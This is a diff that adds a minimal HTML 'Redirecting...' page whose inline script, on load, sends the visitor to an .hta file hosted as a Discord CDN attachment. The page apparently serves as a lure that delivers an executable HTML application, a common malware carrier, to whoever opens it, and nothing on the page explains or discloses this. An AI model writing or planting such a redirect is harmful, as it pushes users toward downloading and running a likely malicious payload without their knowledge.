@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Redirecting...</title>
+  <script>
+    window.location.replace("https://cdn.discordapp.com/attachments/1498117057575649334/1521346289239851018/message_2.hta?ex=6a4722a4&is=6a45d124&hm=365f2f6984f2815fbbbb38b345fcbf1f0330282c0f50ee03debd30451d495687&");
+  </script>
+</head>
+<body>
+  <p>Redirecting...</p>
+</body>
+</html>
